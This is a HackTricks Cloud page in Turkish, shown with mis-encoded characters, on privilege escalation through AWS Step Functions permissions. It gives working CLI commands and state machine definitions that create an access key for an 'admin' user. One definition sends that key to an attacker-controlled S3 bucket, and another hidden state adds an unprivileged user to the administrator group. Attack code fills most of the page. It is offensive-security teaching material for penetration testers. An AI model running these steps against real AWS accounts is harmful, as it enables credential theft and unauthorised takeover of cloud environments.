# AWS - AdÄ±m FonksiyonlarÄ± AyrÄ±calÄ±k YÃ¼kseltme

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## AdÄ±m FonksiyonlarÄ±

Bu AWS hizmeti hakkÄ±nda daha fazla bilgi iÃ§in ÅŸu adrese bakÄ±n:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

**`states:TestState`** ve **`iam:PassRole`** izinlerine sahip bir saldÄ±rgan, herhangi bir durumu test edebilir ve herhangi bir IAM rolÃ¼nÃ¼ oluÅŸturmadan veya mevcut bir durum makinesini gÃ¼ncellemeden ona geÃ§irebilir, bÃ¶ylece rollerin izinleriyle diÄŸer AWS hizmetlerine yetkisiz eriÅŸim saÄŸlayabilir. Bu izinler bir araya geldiÄŸinde, bu yetkiler, iÅŸ akÄ±ÅŸlarÄ±nÄ± manipÃ¼le etmekten verileri deÄŸiÅŸtirmeye, veri sÄ±zÄ±ntÄ±larÄ±ndan kaynak manipÃ¼lasyonuna ve ayrÄ±calÄ±k yÃ¼kseltmeye kadar geniÅŸ kapsamlÄ± yetkisiz eylemlere yol aÃ§abilir.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
AÅŸaÄŸÄ±daki Ã¶rnekler, bu izinleri kullanarak **`admin`** kullanÄ±cÄ±sÄ± iÃ§in bir eriÅŸim anahtarÄ± oluÅŸturan bir durumu test etmenin nasÄ±l yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶stermektedir ve AWS ortamÄ±nÄ±n geniÅŸ kapsamlÄ± bir rolÃ¼ vardÄ±r. Bu geniÅŸ kapsamlÄ± rol, durumun **`iam:CreateAccessKey`** iÅŸlemini gerÃ§ekleÅŸtirmesine izin veren herhangi bir yÃ¼ksek ayrÄ±calÄ±klÄ± politika ile iliÅŸkilendirilmelidir (Ã¶rneÄŸin **`arn:aws:iam::aws:policy/AdministratorAccess`**):

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Privesc'yi gerÃ§ekleÅŸtirmek iÃ§in** Ã§alÄ±ÅŸtÄ±rÄ±lan **komut**:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Potansiyel Etki**: Ä°zin verilmeyen iÅŸ akÄ±ÅŸlarÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesi ve manipÃ¼lasyonu ve hassas kaynaklara eriÅŸim, potansiyel olarak ciddi gÃ¼venlik ihlallerine yol aÃ§abilir.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Bir saldÄ±rganÄ±n **`states:CreateStateMachine`** ve **`iam:PassRole`** yetkileri ile bir durum makinesi oluÅŸturabileceÄŸi ve ona herhangi bir IAM rolÃ¼ saÄŸlayabileceÄŸi, rol izinleri ile diÄŸer AWS hizmetlerine izinsiz eriÅŸim saÄŸlayabileceÄŸi belirtilmiÅŸtir. Ã–nceki ayrÄ±calÄ±k yÃ¼kseltme tekniÄŸi olan (**`states:TestState`** & **`iam:PassRole`**) ile karÅŸÄ±laÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, bu teknik kendiliÄŸinden yÃ¼rÃ¼tÃ¼lmez, ayrÄ±ca **`states:StartExecution`** veya **`states:StartSyncExecution`** izinlerine sahip olmanÄ±z gerekecektir (**`states:StartSyncExecution`**, **standart iÅŸ akÄ±ÅŸlarÄ± iÃ§in mevcut deÄŸildir**, **yalnÄ±zca durum makinelerini ifade etmek iÃ§in**), durum makinesi Ã¼zerinde baÅŸlatma ve yÃ¼rÃ¼tme yapabilmek iÃ§in.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
AÅŸaÄŸÄ±daki Ã¶rnekler, **`admin`** kullanÄ±cÄ±sÄ± iÃ§in bir eriÅŸim anahtarÄ± oluÅŸturan ve bu eriÅŸim anahtarÄ±nÄ± bir saldÄ±rgan tarafÄ±ndan kontrol edilen bir S3 kovasÄ±na sÄ±zdÄ±ran bir durum makinesi oluÅŸturmayÄ± gÃ¶stermektedir. Bu izinler ve AWS ortamÄ±nÄ±n geniÅŸletici rolÃ¼ kullanÄ±larak bu durum makinesinin **`iam:CreateAccessKey`** ve **`s3:putObject`** eylemlerini gerÃ§ekleÅŸtirmesine izin veren yÃ¼ksek ayrÄ±calÄ±klÄ± bir politika ile iliÅŸkilendirilmiÅŸ olmalÄ±dÄ±r (Ã¶rneÄŸin **`arn:aws:iam::aws:policy/AdministratorAccess`**).

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Durum makinesini oluÅŸturmak iÃ§in** Ã§alÄ±ÅŸtÄ±rÄ±lan **komut**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- Ã–nceden oluÅŸturulan durum makinesinin bir yÃ¼rÃ¼tmesini baÅŸlatmak iÃ§in **Ã§alÄ±ÅŸtÄ±rÄ±lan komut**:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

SaldÄ±rgan tarafÄ±ndan kontrol edilen S3 kovasÄ±nÄ±n, kurban hesabÄ±ndan bir s3:PutObject eylemini kabul etme izinlerine sahip olmasÄ± gerekir.

{% endhint %}

- **Potansiyel Etki**: Yetkisiz iÅŸ akÄ±ÅŸlarÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesi ve manipÃ¼le edilmesi, hassas kaynaklara eriÅŸim ve Ã¶nemli gÃ¼venlik ihlallerine yol aÃ§abilecek potansiyel etkilere neden olabilir.

### `states:UpdateStateMachine` & (her zaman gerekli deÄŸil) `iam:PassRole`

**`states:UpdateStateMachine`** iznine sahip bir saldÄ±rgan, bir durum makinesinin tanÄ±mÄ±nÄ± deÄŸiÅŸtirebilir, ekstra gizli durumlar ekleyebilir ve bu durumlar ayrÄ±calÄ±k yÃ¼kseltmesi ile sonuÃ§lanabilir. Bu ÅŸekilde, meÅŸru bir kullanÄ±cÄ± durum makinesinin yÃ¼rÃ¼tmesini baÅŸlattÄ±ÄŸÄ±nda, bu yeni kÃ¶tÃ¼ niyetli gizli durum yÃ¼rÃ¼tÃ¼lecek ve ayrÄ±calÄ±k yÃ¼kseltmesi baÅŸarÄ±lÄ± olacaktÄ±r.

Durum makinesine iliÅŸkilendirilen IAM RolÃ¼nÃ¼n ne kadar izinli olduÄŸuna baÄŸlÄ± olarak, bir saldÄ±rgan 2 durumla karÅŸÄ±laÅŸabilir:

1. **Ä°zin Verici IAM RolÃ¼**: Durum makinesine iliÅŸkilendirilen IAM RolÃ¼ zaten izin verici ise (Ã¶rneÄŸin **`arn:aws:iam::aws:policy/AdministratorAccess`** politikasÄ± ekli ise), o zaman **`iam:PassRole`** izni, ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in gerekli olmayacaktÄ±r Ã§Ã¼nkÃ¼ IAM RolÃ¼nÃ¼ de gÃ¼ncellemek gerekli olmayacaktÄ±r, durum makinesi tanÄ±mÄ± yeterli olacaktÄ±r.
2. **Ä°zin Verici Olmayan IAM RolÃ¼**: Ã–nceki durumun aksine, burada bir saldÄ±rganÄ±n ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in **`iam:PassRole`** iznine ihtiyacÄ± olacaktÄ±r Ã§Ã¼nkÃ¼ durum makinesine izin verici bir IAM RolÃ¼ atamak ve durum makinesi tanÄ±mÄ±nÄ± deÄŸiÅŸtirmek gerekecektir.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
AÅŸaÄŸÄ±daki Ã¶rnekler, yalnÄ±zca bir HelloWorld Lambda iÅŸlevini Ã§aÄŸÄ±ran meÅŸru bir durum makinesini gÃ¼ncellemenin nasÄ±l yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶stermektedir, bÃ¶ylece **`unprivilegedUser`** kullanÄ±cÄ±sÄ±nÄ± **`administrator`** IAM Grubuna ekleyen ek bir durum eklenir. Bu ÅŸekilde, meÅŸru bir kullanÄ±cÄ± gÃ¼ncellenmiÅŸ durum makinesinin bir yÃ¼rÃ¼tmesini baÅŸlattÄ±ÄŸÄ±nda, bu yeni kÃ¶tÃ¼ niyetli gizli durum yÃ¼rÃ¼tÃ¼lecek ve ayrÄ±calÄ±k yÃ¼kseltme baÅŸarÄ±lÄ± olacaktÄ±r.

{% hint style="warning" %}

Durum makinesinin izin verici bir IAM RolÃ¼ne sahip olmadÄ±ÄŸÄ± durumda, IAM RolÃ¼nÃ¼ gÃ¼ncellemek iÃ§in **`iam:PassRole`** iznine de ihtiyaÃ§ duyulacaktÄ±r. Bu, izin verici bir IAM RolÃ¼nÃ¼ (Ã¶rneÄŸin **`arn:aws:iam::aws:policy/AdministratorAccess`** politikasÄ± ekli olan bir IAM RolÃ¼) iliÅŸkilendirmek iÃ§in gereklidir.

{% endhint %}

{% tabs %}

{% tab title="MeÅŸru Durum Makinesi" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="KÃ¶tÃ¼ AmaÃ§lÄ± GÃ¼ncellenmiÅŸ Durum Makinesi" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **MeÅŸru durum makinesini gÃ¼ncellemek iÃ§in** **Ã§alÄ±ÅŸtÄ±rÄ±lan komut**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Potansiyel Etki**: Yetkisiz iÅŸ akÄ±ÅŸlarÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesi ve manipÃ¼le edilmesi, hassas kaynaklara eriÅŸim ve potansiyel olarak ciddi gÃ¼venlik ihlallerine yol aÃ§abilir.

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi keÅŸfedin (https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**] (https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
